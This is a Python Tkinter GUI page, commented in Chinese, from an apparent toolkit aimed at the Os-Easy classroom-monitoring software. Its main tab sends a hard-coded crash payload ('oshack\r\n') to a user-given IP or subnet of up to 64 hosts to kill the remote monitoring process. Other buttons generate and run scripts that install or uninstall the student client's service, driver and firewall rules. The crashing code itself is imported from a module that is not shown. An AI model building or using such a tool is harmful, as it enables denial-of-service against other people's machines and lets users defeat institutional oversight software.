# src/gui/pages/page_advanced.py
# 高级页 —— 按 IP/网段发送崩溃载荷，触发远端 Os-Easy 进程终止

import tkinter as tk
from tkinter import ttk

from src.modules.remote_crasher import crash, crash_targets, expand_cidr, parse_payload, DEFAULT_PORT


class PageAdvanced:

    def __init__(self, ui):
        self.ui = ui

    def build(self):
        ui = self.ui
        frame = ttk.Frame(ui.notebook)

        # ---- 上部：控件（可滚动） ----
        _, ctrl_frame = ui.make_scrollable(frame)

        info_frame = ttk.LabelFrame(ctrl_frame, text="远程功能", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        ttk.Label(info_frame, text="向目标 IP 发送崩溃载荷，触发远端监控进程终止。",
                  foreground="gray").pack(anchor=tk.W, padx=2)

        addr_frame = ttk.Frame(info_frame)
        addr_frame.pack(fill=tk.X, padx=2, pady=5)
        ttk.Label(addr_frame, text="目标 IP/网段:").pack(anchor=tk.W)
        self.ip_input = ttk.Entry(addr_frame)
        self.ip_input.insert(0, "")
        self.ip_input.pack(fill=tk.X, pady=2)
        ui.bind_tooltip(self.ip_input, "FUNC_CRASH_IP")
        ttk.Label(addr_frame, text="端口:").pack(anchor=tk.W)
        self.port_input = ttk.Entry(addr_frame)
        self.port_input.insert(0, str(DEFAULT_PORT))
        self.port_input.pack(fill=tk.X, pady=2)
        ui.bind_tooltip(self.port_input, "FUNC_CRASH_PORT")

        ttk.Label(info_frame, text="载荷:").pack(anchor=tk.W, padx=2)
        self.payload_input = ttk.Entry(info_frame)
        self.payload_input.insert(0, r"oshack\r\n")
        self.payload_input.pack(fill=tk.X, padx=2, pady=2)
        ui.bind_tooltip(self.payload_input, "FUNC_CRASH_PAYLOAD")

        btn_crash = ttk.Button(info_frame, text="发送崩溃指令",
                   command=self._do_crash)
        btn_crash.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_crash, "FUNC_CRASH_SEND")

        # ---- 学生端安装测试 ----
        install_frame = ttk.LabelFrame(ctrl_frame, text="学生端安装测试", padding=5)
        install_frame.pack(fill=tk.X, pady=2)
        ttk.Label(install_frame, text="在指定目录下注册 MMPC 服务、安装管控驱动、添加防火墙规则。",
                  foreground="gray").pack(anchor=tk.W, padx=2)

        ttk.Label(install_frame, text="学生端套件目录（含 MMPC.exe / DriverInstall.exe）:").pack(anchor=tk.W, padx=2)
        self.install_dir = ttk.Entry(install_frame)
        from src.core.settings import toolkit_cfg
        self.install_dir.insert(0, toolkit_cfg.oseasy_path)
        self.install_dir.pack(fill=tk.X, padx=2, pady=2)

        btn_install = ttk.Button(install_frame, text="生成并运行安装测试脚本",
                   command=self._do_install_test)
        btn_install.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_install, "FUNC_INSTALL_STUDENT_TEST")

        btn_uninstall = ttk.Button(install_frame, text="生成并运行卸载测试脚本",
                   command=self._do_uninstall_test)
        btn_uninstall.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_uninstall, "FUNC_UNINSTALL_STUDENT_TEST")

        # ---- 下部：输出区域（固定底部） ----
        output_frame = ttk.Frame(frame)
        output_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=5, pady=2)
        self.result_text = ui.make_output_text(output_frame, height=5)

        return frame

    def _do_crash(self):
        ui = self.ui
        ip = self.ip_input.get().strip()
        if not ip:
            ui.show_snakemessage("请先填写目标 IP/网段")
            return
        try:
            port = int(self.port_input.get().strip() or DEFAULT_PORT)
        except ValueError:
            ui.show_snakemessage("端口必须是数字")
            return
        payload = parse_payload(self.payload_input.get())

        def _run():
            if "/" in ip:
                hosts = expand_cidr(ip)
                result = crash_targets(hosts[:64], port, payload)
            else:
                result = crash(ip, port, payload)
            self.ui.append_text(self.result_text, result, ui.root)

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在向 {ip}:{port} 发送崩溃指令...", ui.root)
        ui._run_in_thread(_run, "远程崩溃")

    def _do_install_test(self):
        """生成并运行学生端安装测试脚本"""
        ui = self.ui
        base = self.install_dir.get().strip()
        from src.core.settings import toolkit_cfg
        if not base:
            base = toolkit_cfg.oseasy_path
        import os
        if not os.path.isdir(base):
            ui.show_snakemessage(f"目录不存在: {base}")
            return

        from src.modules.script_generator import script_gen

        def _on_output(line):
            self.ui.append_text(self.result_text, line, ui.root)

        def _run():
            path = script_gen.run_install_student_test(on_output=_on_output)
            self.ui.append_text(self.result_text, f"安装测试脚本已运行: {path}", ui.root)

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在生成并运行安装测试脚本（目录: {base}）...", ui.root)
        ui._run_in_thread(_run, "学生端安装测试")

    def _do_uninstall_test(self):
        """生成并运行学生端卸载测试脚本"""
        ui = self.ui
        base = self.install_dir.get().strip()
        from src.core.settings import toolkit_cfg
        if not base:
            base = toolkit_cfg.oseasy_path
        import os
        if not os.path.isdir(base):
            ui.show_snakemessage(f"目录不存在: {base}")
            return

        from src.modules.script_generator import script_gen

        def _on_output(line):
            self.ui.append_text(self.result_text, line, ui.root)

        def _run():
            path = script_gen.run_uninstall_student_test(on_output=_on_output)
            self.ui.append_text(self.result_text, f"卸载测试脚本已运行: {path}", ui.root)

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在生成并运行卸载测试脚本（目录: {base}）...", ui.root)
        ui._run_in_thread(_run, "学生端卸载测试")